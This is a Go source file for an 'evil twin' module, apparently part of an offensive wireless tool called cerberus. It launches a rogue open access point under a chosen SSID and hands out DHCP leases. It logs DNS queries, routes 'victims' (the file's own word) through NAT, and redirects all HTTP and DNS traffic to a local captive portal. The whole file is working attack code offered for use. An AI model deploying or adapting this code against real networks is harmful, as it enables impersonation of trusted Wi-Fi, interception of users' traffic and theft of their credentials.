package eviltwin

import (
	"fmt"
	"log"
	"os"
	"os/exec"
	"sync"
	"text/template"
	"time"
)

type Config struct {
	SSID      string `json:"ssid"`
	Channel   int    `json:"channel"`
	Iface     string `json:"iface"`       // Monitor mode interface for the AP
	OutIface  string `json:"out_iface"`    // Internet-facing interface (wan, eth0, etc.)
	WithDHCP  bool   `json:"with_dhcp"`
	WithNAT   bool   `json:"with_nat"`
	CaptiveOn bool   `json:"captive_on"`   // Enable captive portal redirect
}

type TwinStatus struct {
	Running    bool   `json:"running"`
	SSID       string `json:"ssid"`
	Channel    int    `json:"channel"`
	Iface      string `json:"iface"`
	Clients    int    `json:"clients"`
	StartedAt  int64  `json:"started_at"`
}

type Manager struct {
	status  TwinStatus
	cfg     Config
	hostapd *exec.Cmd
	dnsmasq *exec.Cmd
	mu      sync.RWMutex
	stop    chan struct{}
}

func NewManager() *Manager {
	return &Manager{}
}

func (m *Manager) Start(cfg Config) error {
	m.mu.Lock()
	defer m.mu.Unlock()

	if m.status.Running {
		return fmt.Errorf("evil twin already running")
	}

	m.cfg = cfg
	m.stop = make(chan struct{})

	// Configure the interface
	if err := m.setupInterface(); err != nil {
		return fmt.Errorf("interface setup: %w", err)
	}

	// Write hostapd config
	if err := m.writeHostapdConf(); err != nil {
		return fmt.Errorf("hostapd config: %w", err)
	}

	// Start hostapd
	m.hostapd = exec.Command("hostapd", "/tmp/cerberus-hostapd.conf")
	m.hostapd.Stdout = os.Stdout
	m.hostapd.Stderr = os.Stderr
	if err := m.hostapd.Start(); err != nil {
		return fmt.Errorf("hostapd start: %w", err)
	}

	// Wait a moment for hostapd to initialize
	time.Sleep(2 * time.Second)

	// Assign IP to the AP interface
	run("ip", "addr", "flush", "dev", cfg.Iface)
	run("ip", "addr", "add", "192.168.66.1/24", "dev", cfg.Iface)
	run("ip", "link", "set", cfg.Iface, "up")

	// Start DHCP if requested
	if cfg.WithDHCP {
		if err := m.writeDnsmasqConf(); err != nil {
			m.hostapd.Process.Kill()
			return fmt.Errorf("dnsmasq config: %w", err)
		}

		m.dnsmasq = exec.Command("dnsmasq",
			"-C", "/tmp/cerberus-dnsmasq.conf",
			"--no-daemon",
		)
		if err := m.dnsmasq.Start(); err != nil {
			m.hostapd.Process.Kill()
			return fmt.Errorf("dnsmasq start: %w", err)
		}
	}

	// NAT so victims get internet through us
	if cfg.WithNAT {
		m.enableNAT()
	}

	// Captive portal redirect — send all HTTP to our portal
	if cfg.CaptiveOn {
		m.enableCaptiveRedirect()
	}

	m.status = TwinStatus{
		Running:   true,
		SSID:      cfg.SSID,
		Channel:   cfg.Channel,
		Iface:     cfg.Iface,
		StartedAt: time.Now().Unix(),
	}

	log.Printf("eviltwin: started AP '%s' on channel %d", cfg.SSID, cfg.Channel)
	return nil
}

func (m *Manager) Stop() error {
	m.mu.Lock()
	defer m.mu.Unlock()

	if !m.status.Running {
		return nil
	}

	close(m.stop)

	// Kill processes
	if m.hostapd != nil && m.hostapd.Process != nil {
		m.hostapd.Process.Kill()
		m.hostapd.Wait()
	}
	if m.dnsmasq != nil && m.dnsmasq.Process != nil {
		m.dnsmasq.Process.Kill()
		m.dnsmasq.Wait()
	}

	// Clean up NAT rules
	if m.cfg.WithNAT {
		m.disableNAT()
	}
	if m.cfg.CaptiveOn {
		m.disableCaptiveRedirect()
	}

	// Clean up temp files
	os.Remove("/tmp/cerberus-hostapd.conf")
	os.Remove("/tmp/cerberus-dnsmasq.conf")

	m.status.Running = false
	log.Println("eviltwin: stopped")
	return nil
}

func (m *Manager) Status() TwinStatus {
	m.mu.RLock()
	defer m.mu.RUnlock()

	if m.status.Running {
		// Count connected clients from hostapd
		out, err := exec.Command("hostapd_cli", "-i", m.cfg.Iface, "list_sta").Output()
		if err == nil {
			count := 0
			for _, line := range splitLines(string(out)) {
				if isMAC(line) {
					count++
				}
			}
			m.status.Clients = count
		}
	}

	return m.status
}

func (m *Manager) setupInterface() error {
	// Take interface out of any existing mode and prepare it
	run("airmon-ng", "check", "kill")
	run("ip", "link", "set", m.cfg.Iface, "down")
	run("iw", "dev", m.cfg.Iface, "set", "type", "__ap")
	run("ip", "link", "set", m.cfg.Iface, "up")
	return nil
}

func (m *Manager) writeHostapdConf() error {
	tmpl := `interface={{.Iface}}
driver=nl80211
ssid={{.SSID}}
hw_mode=g
channel={{.Channel}}
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=0
`
	t, err := template.New("hostapd").Parse(tmpl)
	if err != nil {
		return err
	}

	f, err := os.Create("/tmp/cerberus-hostapd.conf")
	if err != nil {
		return err
	}
	defer f.Close()

	return t.Execute(f, m.cfg)
}

func (m *Manager) writeDnsmasqConf() error {
	conf := fmt.Sprintf(`interface=%s
dhcp-range=192.168.66.10,192.168.66.250,255.255.255.0,12h
dhcp-option=option:router,192.168.66.1
dhcp-option=option:dns-server,192.168.66.1
server=8.8.8.8
log-queries
log-facility=/tmp/cerberus-eviltwin-dns.log
no-resolv
`, m.cfg.Iface)

	return os.WriteFile("/tmp/cerberus-dnsmasq.conf", []byte(conf), 0644)
}

func (m *Manager) enableNAT() {
	run("sh", "-c", "echo 1 > /proc/sys/net/ipv4/ip_forward")
	run("iptables", "-t", "nat", "-A", "POSTROUTING", "-o", m.cfg.OutIface, "-j", "MASQUERADE")
	run("iptables", "-A", "FORWARD", "-i", m.cfg.Iface, "-o", m.cfg.OutIface, "-j", "ACCEPT")
	run("iptables", "-A", "FORWARD", "-i", m.cfg.OutIface, "-o", m.cfg.Iface, "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT")
}

func (m *Manager) disableNAT() {
	run("iptables", "-t", "nat", "-D", "POSTROUTING", "-o", m.cfg.OutIface, "-j", "MASQUERADE")
	run("iptables", "-D", "FORWARD", "-i", m.cfg.Iface, "-o", m.cfg.OutIface, "-j", "ACCEPT")
	run("iptables", "-D", "FORWARD", "-i", m.cfg.OutIface, "-o", m.cfg.Iface, "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT")
}

func (m *Manager) enableCaptiveRedirect() {
	// Redirect all HTTP traffic to our captive portal
	run("iptables", "-t", "nat", "-A", "PREROUTING", "-i", m.cfg.Iface, "-p", "tcp", "--dport", "80", "-j", "DNAT", "--to-destination", "192.168.66.1:8080")
	// Redirect DNS to our dnsmasq
	run("iptables", "-t", "nat", "-A", "PREROUTING", "-i", m.cfg.Iface, "-p", "udp", "--dport", "53", "-j", "DNAT", "--to-destination", "192.168.66.1:53")
}

func (m *Manager) disableCaptiveRedirect() {
	run("iptables", "-t", "nat", "-D", "PREROUTING", "-i", m.cfg.Iface, "-p", "tcp", "--dport", "80", "-j", "DNAT", "--to-destination", "192.168.66.1:8080")
	run("iptables", "-t", "nat", "-D", "PREROUTING", "-i", m.cfg.Iface, "-p", "udp", "--dport", "53", "-j", "DNAT", "--to-destination", "192.168.66.1:53")
}

func run(name string, args ...string) error {
	return exec.Command(name, args...).Run()
}

func splitLines(s string) []string {
	var lines []string
	for _, l := range splitString(s, '\n') {
		l = trimSpace(l)
		if l != "" {
			lines = append(lines, l)
		}
	}
	return lines
}

func splitString(s string, sep byte) []string {
	var result []string
	start := 0
	for i := 0; i < len(s); i++ {
		if s[i] == sep {
			result = append(result, s[start:i])
			start = i + 1
		}
	}
	result = append(result, s[start:])
	return result
}

func trimSpace(s string) string {
	start, end := 0, len(s)
	for start < end && (s[start] == ' ' || s[start] == '\t' || s[start] == '\r' || s[start] == '\n') {
		start++
	}
	for end > start && (s[end-1] == ' ' || s[end-1] == '\t' || s[end-1] == '\r' || s[end-1] == '\n') {
		end--
	}
	return s[start:end]
}

func isMAC(s string) bool {
	if len(s) != 17 {
		return false
	}
	for i, c := range s {
		if (i+1)%3 == 0 {
			if c != ':' {
				return false
			}
		} else {
			if !((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F')) {
				return false
			}
		}
	}
	return true
}
